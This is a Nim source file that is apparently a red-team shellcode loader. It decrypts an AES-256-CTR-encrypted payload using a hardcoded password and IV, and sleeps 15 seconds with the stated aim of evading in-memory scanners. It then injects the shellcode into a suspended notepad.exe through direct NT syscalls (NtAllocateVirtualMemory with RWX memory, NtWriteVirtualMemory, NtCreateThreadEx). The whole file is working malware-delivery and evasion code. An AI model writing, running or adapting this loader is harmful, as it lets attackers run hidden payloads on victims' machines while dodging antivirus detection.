import winim/lean
import osproc
import os
import strformat
import base64
import nimcrypto
import nimcrypto/sysrand
include syscalls

proc pwndem[byte](shellcode: openArray[byte]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = tProcess.processID

    var status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo "[*] pHandle: ", pHandle

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr shellcode, 
        sc_size-1, 
        addr bytesWritten);

    echo "[*] WriteProcessMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL);

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"


when isMainModule:
    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))
    let
        zzahs: string = "VEVTVA=="
        password: string = decode(zzahs)
        inFile: string = "p6M87Dk2xTM5+6Ct4+g5yZu9pb5QZ+BQOjChc4FvjPfKo3ueFBYyuDQrMarC57D8THIHl2QCRygMJCdCT5MX4lFuRWHoF1YZEWcwpjOBZ5KOluT05WoQ7O8PsYEhUMdnbL9rprYVhauCJ4Ks4xeWdf5bXYp9MKWG0YwcSfRxDv9DzZ7LEwkICTd5KN+U83S7AUXFVqagk2E89/OAplvpPa+9KIvBV4Ek0vejXz7ocjpHqteLO8kEH2NaSSjk7lSmfXmadgu9RrssDW31huel+4FU9Abv71vxToapm4Q8pMapdoB5E1/C00ycN7mNIdMmOqUicK2cggKFXm9bf2gbtYWEFvl/e/ZWKDC67v5yIcVee167hlUJLdrRqxoJGsHeAqBCcRAsng=="
    var
        inFileContents: string = inFile
        encrypted: seq[byte] = toByteSeq(decode(inFileContents))
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        decrypted: seq[byte] = newSeq[byte](len(encrypted))
    # Create Static IV
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]

    # Expand key to 32 bytes using SHA256 as the KDF
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
    echo fmt"[*] Sleeping to evade in memory scanners"
    sleep(15000)
    
    dctx.init(key, iv)
    dctx.decrypt(encrypted, decrypted)
    dctx.clear()
    
    pwndem(decrypted)
